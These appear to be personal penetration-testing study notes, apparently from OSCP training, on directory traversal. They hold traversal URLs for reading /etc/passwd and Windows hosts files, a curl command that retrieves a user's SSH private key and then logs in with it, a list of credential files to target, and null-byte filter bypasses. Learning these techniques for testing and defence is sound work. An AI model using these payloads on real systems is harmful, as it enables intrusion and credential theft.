Allows attackers to gain unauthorized access to files within an app or files not normally accessible through a web interface.  
This vuln occurs when input is poorly validated allowing for manipulation of file paths with _**../**_ or _**..\\**_  
  
Can be used to help facilitate [file inclusion](9.2%20-%20File%20Inclusion.md) attacks.  

#### Absolute paths
Ex (from user's home folder):   /etc/passwd
- Specifies the full file system path including all subdirectories
- Starts with a '/' to denote the root file system

#### Relative paths
Ex (from user's home folder): ../../etc/passwd
- Refer to the path of a file/ dir relatively from where you currently are
	- Ex:     ../
- Number of **../** sequences is only relevant until the root file system is reached.
- Theoretically, can add as many **../** as desired, since there is nowhere further back to go from **/**
	- Can be useful in certain situations: when we don't know our current working directory.
		- Could specify a large number of **../** to ensure we reach the root file system from a relative pathing perspective.

#### Standard web root directories

Apache
- /var/www/html/  
MariaDB
- C:/xampp/htdocs/  
Nginx
- /usr/share/nginx/html  
- /data/www/

## ID'ing

Always important to hover over all buttons and links to gather info about the page's structure and how parameters are crafted, etc.

Found by examining URL query strings and form bodies in search of values that appear as file references (inc file extensions in URL query strings)  
Ex URL:  
```html
http://target.com/cms/login.php?language=en.html
```
	Note: Site uses php ^ (most aren't this obvious)
	the *language* parameter has an HTML page as its value.  if you can successfully open it, you can canfirm that en.html is a file on the server
		and can try other file names.
	*cms* directory indicates that the web app is running in a subdirectory of the web root
	
Test if file exists on the server:
```html
http://target.com/cms/en.html
```
	If successful, means it's a file stored on the server and allows for a potential entry point for other file names
	Always examine parameters closely when they use files as a value.

Depending on the error message received after playing with the ‘file’ parameter value, we may determine the OS and be able to adjust the XSS payload to target specific files  
Ex URL:  
```html
http://target.com/menu.php?file=c:\windows\system32\drivers\etc\hosts
```


## Testing

When viewing sites and their pages URLs, noticing how parameters for viewing these pages is important.
Scrolling down to the bottom of OSCP's example site, notice a link labeled 'Admin'
![](admin_oscpsite.png)
	Hovering over reveals the link:
```html
http://mountaindesserts.com/meteor/index.php?page=admin.php
```

PHP uses **$\_GET** to manage variables via the GET request.

Clicking on the link presents us an error message stating that the page is currently under maintenance.
![](adminlink_oscpsite.png)
	This info is shown on the SAME page as the index....

Navigating to **hxxp://mountaindeserts[.]com/meteor/admin.php** will show the SAME message that was shown on the **index.php** page after clicking the 'Admin' link.

***What this indicates***  is that the webapp includes the content of the admin.php page via the *page* parameter and displays it under the 'Admin' link
	- Hints at a potentially vulnerable parameter

Can now try to use **../** to traverse directories
```html
http://mountaindesserts.com/meteor/index.php?page=../../../../../../etc/passwrd
```

## Encoding Special Characters


## Useful directories and files

When retrieving important files (rsa private key for example), use [**curl**](OS%20Commands.md#curl) to obtain the information.
- Browsers often try to parse or optimize elements for user friendliness which could lead to issues.
- HTTP code with be returned, so only copy/ save the part you need.
	- For SSH keys, copy from **-----BEGIN OPENSSH PRIVATE KEY-----** through **-----END OPENSSH PRIVATE KEY-----** only
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../home/offsec/.ssh/id_rsa
# copy ssh key parts only & save to a file <key_file>
# change the perms of the file to be strict
chmod 400 <key_file>
# connect via their ssh key
ssh -i <key_file> -p 2222 offsec@mountaindesserts.com
```


#### Linux  - /
- /etc/password - (get user names)
- /etc/shadow - (get user hashes)
- /etc/hosts - (get internal network mapping)
- /home/\<user>/.ssh/id_rsa - (get ssh keys from said users)
  
#### Windows  - \\
- C\:\\boot.ini
- C\:\\windows\\system32\\drivers\\etc\\hosts
- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\. - (If running IIS web server, get logs)
- C:\\inetpub\\wwwroot\\web.config - (If running IIS web server, potentially get usernames or passwords)
  
  
## Null Bytes
Developers can specify the type of file it's looking for:  
```html
http://target.com/menu.php?file=/etc/passwd
<!--becomes-->
http://target.com/menu.php?file/etc/passwd.php
```
  
Adding the Null Byte _%00_ or _0x00_ to terminate the string and trick the webapp into ignoring everything else afterwards:  
```html
http://target.com/menu.php?file=/etc/passwd%00
```


*This is patched in PHP 5.3.4 and above  
  
If the files are blocked, can attempt to view them by adding a _./_ at the end:  
```html
http://target.com/menu.php?file=../../../../etc/passwd/.
```
